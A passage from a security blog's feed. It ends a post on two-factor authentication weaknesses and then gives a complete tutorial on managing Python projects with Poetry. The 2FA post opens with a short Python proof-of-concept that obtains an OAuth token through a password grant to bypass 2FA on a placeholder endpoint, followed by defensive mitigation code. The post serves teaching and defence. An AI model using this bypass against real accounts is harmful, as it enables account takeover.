class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># Request token from misconfigured endpoint</span><br><span class="line">token_response = requests.post(&quot;https://example.com/oauth/token&quot;, data=&#123;&quot;grant_type&quot;: &quot;password&quot;, &quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;)</span><br><span class="line"></span><br><span class="line">access_token = token_response.json().get(&quot;access_token&quot;)</span><br><span class="line"></span><br><span class="line"># Use the token to bypass 2FA</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;access_token&#125;&quot;&#125;</span><br><span class="line">response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.status_code)  # 200 indicates bypass</span><br></pre></td></tr></table></figure><p><strong>Mitigation:</strong></p><ul><li>Require 2FA completion before issuing access tokens.</li><li>Validate tokens for proper authentication scope and origin.</li></ul><h3 id="Additional-Vulnerabilities-in-2FA-Disabling"><a href="#Additional-Vulnerabilities-in-2FA-Disabling" class="headerlink" title="Additional Vulnerabilities in 2FA Disabling"></a><strong>Additional Vulnerabilities in 2FA Disabling</strong></h3><h4 id="1-Lack-of-Log-Auditing"><a href="#1-Lack-of-Log-Auditing" class="headerlink" title="1. Lack of Log Auditing"></a><strong>1. Lack of Log Auditing</strong></h4><p>If 2FA enable&#x2F;disable actions are not logged properly, attackers can disable 2FA without detection, leaving the user and administrators unaware of the breach.</p><p><strong>Impact:</strong> Attackers can disable 2FA stealthily, making accounts vulnerable.</p><p><strong>Mitigation:</strong></p><ul><li>Log all 2FA-related actions, including enabling, disabling, and failed attempts.</li><li>Include details like timestamps, IP addresses, and user-agent strings in the logs.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def disable_2fa(user_id):</span><br><span class="line">    # Perform the 2FA disabling logic</span><br><span class="line">    perform_disable_2fa(user_id)</span><br><span class="line">    </span><br><span class="line">    # Log the action</span><br><span class="line">    log_action(</span><br><span class="line">        user_id=user_id,</span><br><span class="line">        action=&quot;2FA Disabled&quot;,</span><br><span class="line">        ip_address=get_client_ip(),</span><br><span class="line">        user_agent=get_user_agent(),</span><br><span class="line">        timestamp=get_current_timestamp()</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><hr><h4 id="2-Weak-Backup-Code-Security"><a href="#2-Weak-Backup-Code-Security" class="headerlink" title="2. Weak Backup Code Security"></a><strong>2. Weak Backup Code Security</strong></h4><p>Backup codes are often provided for account recovery if the primary 2FA device is unavailable. If these codes are predictable, insufficiently long, or not invalidated after use, attackers can exploit them.</p><p><strong>Impact:</strong> Attackers can guess or steal backup codes to disable 2FA.</p><p><strong>Mitigation:</strong></p><ul><li>Generate backup codes with sufficient complexity (e.g., random alphanumeric strings).</li><li>Automatically invalidate used codes.</li><li>Require additional verification (e.g., password input) to use backup codes.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import secrets</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def generate_backup_code():</span><br><span class="line">    return &#x27;&#x27;.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))</span><br><span class="line"></span><br><span class="line">def validate_backup_code(user_id, input_code):</span><br><span class="line">    stored_code = get_user_backup_code(user_id)</span><br><span class="line">    if stored_code and input_code == stored_code:</span><br><span class="line">        invalidate_backup_code(user_id)</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure><hr><h4 id="3-Lack-of-Notification-Mechanism"><a href="#3-Lack-of-Notification-Mechanism" class="headerlink" title="3. Lack of Notification Mechanism"></a><strong>3. Lack of Notification Mechanism</strong></h4><p>If users are not notified when 2FA is disabled, attackers can disable 2FA without the user’s knowledge, leaving accounts exposed.</p><p><strong>Impact:</strong> The legitimate user remains unaware of the security breach.</p><p><strong>Mitigation:</strong></p><ul><li>Send real-time notifications (email, SMS, or push) to users whenever 2FA settings are modified.</li><li>Include information about the device, IP address, and timestamp in the notification.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def notify_user(user_id, action):</span><br><span class="line">    user_email = get_user_email(user_id)</span><br><span class="line">    send_email(</span><br><span class="line">        to=user_email,</span><br><span class="line">        subject=&quot;Security Alert: 2FA Disabled&quot;,</span><br><span class="line">        message=f&quot;Your 2FA was disabled at &#123;get_current_timestamp()&#125; from IP &#123;get_client_ip()&#125;.&quot;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><hr><h4 id="4-Sensitive-Operations-Lack-Additional-Verification"><a href="#4-Sensitive-Operations-Lack-Additional-Verification" class="headerlink" title="4. Sensitive Operations Lack Additional Verification"></a><strong>4. Sensitive Operations Lack Additional Verification</strong></h4><p>Systems often fail to require additional verification (e.g., password input) when disabling 2FA, making it easier for attackers to perform this action if they gain access to the account.</p><p><strong>Impact:</strong> Attackers can easily disable 2FA without the need for additional authentication.</p><p><strong>Mitigation:</strong></p><ul><li>Require users to re-enter their password or confirm their identity through another method (e.g., biometric authentication) before disabling 2FA.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def verify_password(user_id, input_password):</span><br><span class="line">    stored_hash = get_user_password_hash(user_id)</span><br><span class="line">    return check_password_hash(input_password, stored_hash)</span><br><span class="line"></span><br><span class="line">def disable_2fa_with_verification(user_id, input_password):</span><br><span class="line">    if verify_password(user_id, input_password):</span><br><span class="line">        perform_disable_2fa(user_id)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Password verification failed.&quot;)</span><br></pre></td></tr></table></figure><hr><h4 id="5-Session-Token-Not-Expired-After-2FA-Disabling"><a href="#5-Session-Token-Not-Expired-After-2FA-Disabling" class="headerlink" title="5. Session Token Not Expired After 2FA Disabling"></a><strong>5. Session Token Not Expired After 2FA Disabling</strong></h4><p>If session tokens are not invalidated after disabling 2FA, attackers can continue using the old session without triggering new authentication.</p><p><strong>Impact:</strong> Attackers with an active session can bypass any changes in authentication settings.</p><p><strong>Mitigation:</strong></p><ul><li>Revoke all active sessions after disabling 2FA.</li><li>Require the user to log in again with updated authentication settings.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def revoke_all_sessions(user_id):</span><br><span class="line">    # Remove all active sessions from the database</span><br><span class="line">    delete_sessions_for_user(user_id)</span><br><span class="line"></span><br><span class="line">def disable_2fa(user_id):</span><br><span class="line">    perform_disable_2fa(user_id)</span><br><span class="line">    revoke_all_sessions(user_id)</span><br></pre></td></tr></table></figure><hr><h4 id="6-CSRF-Vulnerabilities-in-2FA-Related-Actions"><a href="#6-CSRF-Vulnerabilities-in-2FA-Related-Actions" class="headerlink" title="6. CSRF Vulnerabilities in 2FA-Related Actions"></a><strong>6. CSRF Vulnerabilities in 2FA-Related Actions</strong></h4><p>Cross-Site Request Forgery (CSRF) vulnerabilities can allow attackers to trick authenticated users into disabling 2FA without their knowledge.</p><p><strong>Impact:</strong> Attackers can craft malicious links or forms to disable 2FA on behalf of the user.</p><p><strong>Mitigation:</strong></p><ul><li>Use CSRF tokens for all 2FA-related actions.</li><li>Validate the token server-side for each request.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def validate_csrf_token(input_token, session_token):</span><br><span class="line">    return input_token == session_token</span><br><span class="line"></span><br><span class="line">def disable_2fa(request, user_id):</span><br><span class="line">    csrf_token = request.get(&quot;csrf_token&quot;)</span><br><span class="line">    if not validate_csrf_token(csrf_token, get_session_csrf_token(user_id)):</span><br><span class="line">        raise Exception(&quot;CSRF token validation failed.&quot;)</span><br><span class="line">    perform_disable_2fa(user_id)</span><br></pre></td></tr></table></figure><hr><h4 id="7-Misuse-of-Developer-Debug-Modes"><a href="#7-Misuse-of-Developer-Debug-Modes" class="headerlink" title="7. Misuse of Developer Debug Modes"></a><strong>7. Misuse of Developer Debug Modes</strong></h4><p>In some cases, debug modes allow bypassing 2FA for testing purposes. If left enabled in production, attackers can exploit these debug features.</p><p><strong>Impact:</strong> Attackers can completely bypass 2FA protections.</p><p><strong>Mitigation:</strong></p><ul><li>Ensure debug modes are disabled in production builds.</li><li>Implement runtime checks to verify that debug flags are not present.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def ensure_debug_mode_disabled():</span><br><span class="line">    if is_debug_mode():</span><br><span class="line">        raise Exception(&quot;Debug mode is enabled in production!&quot;)</span><br><span class="line"></span><br><span class="line">def perform_sensitive_action():</span><br><span class="line">    ensure_debug_mode_disabled()</span><br><span class="line">    # Proceed with action</span><br></pre></td></tr></table></figure><hr><h4 id="8-Poorly-Configured-API-Permissions"><a href="#8-Poorly-Configured-API-Permissions" class="headerlink" title="8. Poorly Configured API Permissions"></a><strong>8. Poorly Configured API Permissions</strong></h4><p>APIs that allow 2FA disabling may not properly restrict access. Attackers can exploit misconfigured permissions to disable 2FA via APIs.</p><p><strong>Impact:</strong> Attackers can send unauthorized API requests to disable 2FA.</p><p><strong>Mitigation:</strong></p><ul><li>Implement strict authentication and authorization checks for API endpoints.</li><li>Require API requests to be signed and session-bound.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def disable_2fa_api(request, user_id):</span><br><span class="line">    api_token = request.headers.get(&quot;Authorization&quot;)</span><br><span class="line">    if not validate_api_token(api_token, user_id):</span><br><span class="line">        raise Exception(&quot;Invalid API token.&quot;)</span><br><span class="line">    perform_disable_2fa(user_id)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Description-of-2FA-Vulnerabilities&quot;&gt;&lt;a href=&quot;#Description-of-2FA-Vulnerabilities&quot; class=&quot;headerlink&quot; title=&quot;Description of 2FA Vulne</summary>
      
    
    
    
    
    <category term="vuls" scheme="http://iaaaannn0.com/tags/vuls/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Guide to Managing Python Projects with Poetry</title>
    <link href="http://iaaaannn0.com/2025/01/30/poetry/"/>
    <id>http://iaaaannn0.com/2025/01/30/poetry/</id>
    <published>2025-01-30T04:09:36.000Z</published>
    <updated>2025-01-30T04:37:45.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Poetry is a powerful dependency management and packaging tool for Python. It provides a seamless workflow for managing dependencies, creating virtual environments, and packaging applications. This guide will walk you through the essential features of Poetry, including how to generate a <code>requirements.txt</code> file for compatibility with <code>pip</code>.</p></blockquote><h2 id="1-Installing-Poetry"><strong>1. Installing Poetry</strong></h2><p>To install Poetry, run the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://install.python-poetry.org | python3 -</span><br></pre></td></tr></table></figure><p>After installation, ensure Poetry is available in your terminal by checking its version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry --version</span><br></pre></td></tr></table></figure><p>If the command does not work, add Poetry to your PATH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$HOME/.local/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><h2 id="2-Creating-a-New-Poetry-Project"><strong>2. Creating a New Poetry Project</strong></h2><p>To create a new Python project with Poetry, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry new my_project</span><br></pre></td></tr></table></figure><p>This command sets up a basic Python package structure:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my_project/</span><br><span class="line">├── pyproject.toml  # Configuration file for Poetry</span><br><span class="line">├── README.rst</span><br><span class="line">├── my_project/     # Project source code</span><br><span class="line">│   └── __init__.py</span><br><span class="line">└── tests/          # Test files</span><br></pre></td></tr></table></figure><p>If you already have a project and want to initialize Poetry within it, navigate to the project directory and run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry init</span><br></pre></td></tr></table></figure><p>This will guide you through setting up <code>pyproject.toml</code> interactively.</p><h2 id="3-Managing-Dependencies"><strong>3. Managing Dependencies</strong></h2><h3 id="Adding-Dependencies"><strong>Adding Dependencies</strong></h3><p>To install a package and automatically update <code>pyproject.toml</code> and <code>poetry.lock</code>, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry add requests</span><br></pre></td></tr></table></figure><p>For a development-only dependency:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry add --dev pytest</span><br></pre></td></tr></table></figure><h3 id="Removing-Dependencies"><strong>Removing Dependencies</strong></h3><p>To remove a package:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry remove requests</span><br></pre></td></tr></table></figure><h3 id="Updating-Dependencies"><strong>Updating Dependencies</strong></h3><p>To update all dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry update</span><br></pre></td></tr></table></figure><p>To update a specific package:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry update requests</span><br></pre></td></tr></table></figure><h2 id="4-Virtual-Environments-and-Running-Code"><strong>4. Virtual Environments and Running Code</strong></h2><p>Poetry automatically manages a virtual environment for your project. You can activate it with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry shell</span><br></pre></td></tr></table></figure><p>To run a Python script within the virtual environment without activating the shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry run python script.py</span><br></pre></td></tr></table></figure><p>To check the virtual environment being used:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry env info</span><br></pre></td></tr></table></figure><h2 id="5-Exporting-Requirements-for-pip"><strong>5. Exporting Requirements for pip</strong></h2><p>Poetry does not use <code>requirements.txt</code> natively, but you can export dependencies for environments that require it (e.g., Docker, CI/CD pipelines).</p><h3 id="6-Install-the-Poetry-Export-Plugin">6. <strong>Install the Poetry Export Plugin</strong></h3><p>Poetry 2.0+ requires an additional plugin to export dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry self add poetry-plugin-export</span><br></pre></td></tr></table></figure><h3 id="7-Generate-requirements-txt">7. <strong>Generate</strong> <code>requirements.txt</code></h3><p>Run the following command to export dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry export -f requirements.txt --output requirements.txt --without-hashes</span><br></pre></td></tr></table></figure><p>If you need to include development dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry export -f requirements.txt --output requirements.txt --without-hashes --with dev</span><br></pre></td></tr></table></figure><p>You can then install these dependencies using pip:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="8-Version-Management"><strong>8. Version Management</strong></h2><p>To check the current project version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry version</span><br></pre></td></tr></table></figure><p>To update the version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poetry version patch  # Increases 1.0.0 -&gt; 1.0.1</span><br><span class="line">poetry version minor  # Increases 1.0.0 -&gt; 1.1.0</span><br><span class="line">poetry version major  # Increases 1.0.0 -&gt; 2.0.0</span><br></pre></td></tr></table></figure><h2 id="9-Publishing-to-PyPI"><strong>9. Publishing to PyPI</strong></h2><p>To publish your package to PyPI, first build it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry build</span><br></pre></td></tr></table></figure><p>Then publish it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry publish</span><br></pre></td></tr></table></figure><p>To publish to TestPyPI for testing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry publish --repository testpypi</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><strong>Conclusion</strong></h2><p>Poetry simplifies dependency management, virtual environments, and packaging for Python projects. By using Poetry, you can ensure a more reliable and consistent development workflow. With the ability to export <code>requirements.txt</code>, Poetry remains compatible with traditional Python workflows while providing a modern alternative to <code>pip</code> and <code>virtualenv</code>.</p><p>Start using Poetry today to streamline your Python project management! 🚀</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Poetry is a powerful dependency management and packaging tool for Python. It provides a seamless workflow for managing depen</summary>
      
    
    
    
    
    <category term="poetry" scheme="http://iaaaannn0.com/tags/poetry/"/>
    
  </entry>
  
</feed>
